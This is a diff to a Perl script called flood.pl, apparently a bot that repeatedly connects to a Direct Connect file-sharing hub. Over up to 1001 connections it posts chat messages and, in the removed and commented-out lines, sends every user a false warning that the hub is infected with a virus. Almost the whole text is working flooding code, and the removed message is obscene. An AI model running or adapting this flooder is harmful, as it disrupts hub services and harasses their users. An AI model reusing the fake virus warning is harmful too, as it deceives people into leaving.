@@ -27,7 +27,7 @@ use lib './lib';
 use dcppp::clihub;
 print("usage: flood.pl [dchub://]host[:port] [bot_nick]\n"), exit if !$ARGV[0];
 $ARGV[0] =~ m|^(?:dchub\://)?(.+?)(?:\:(\d+))?$|;
-for ( 0 .. 1000 ) {
+TRY: for ( 0 .. 1000 ) {
   my $dc = dcppp::clihub->new(
     'host' => $1,
     ( $2 ? ( 'port' => $2 ) : () ),
@@ -42,9 +42,18 @@ for ( 0 .. 1000 ) {
     'description' => '',
     'M'           => 'P',
   );
+  for ( 1 .. 15 ) {    #sleep(5); $dc->recv();
+    next TRY if !$dc->{'socket'} or $dc->{'status'} eq 'connected';
+    $dc->recv();
+    sleep(1);
+  }
   print("BOT SEND all\n"),
-    $dc->cmd( 'chatline', 'Доброго времени суток! Пользуясь случаем, хотим сказать вам: ВЫ Э@3Б@ЛИ СПАМИТЬ!' );
-  print("BOT SEND to $_\n"), $dc->cmd( 'To', $_, ' HUB заражен вирусом срочно покиньте его!' ) for keys %{ $dc->{'NickList'} };
+    $dc->cmd( 'chatline', 
+'Доброго времени суток! Пользуясь случаем, хотим попросить Вас больше никогда не рекламировать свой хаб где попало. Спасибо. '. $_
+#    'Доброго времени суток! Пользуясь случаем, хотим сказать вам: ВЫ Э@3Б@ЛИ СПАМИТЬ!' 
+    );
+
+#  print("BOT SEND to $_\n"), $dc->cmd( 'To', $_, ' HUB заражен вирусом срочно покиньте его!' ) for keys %{ $dc->{'NickList'} };
   $dc->recv();    #sleep(5); $dc->recv();
   $dc->destroy();
   sleep(2);
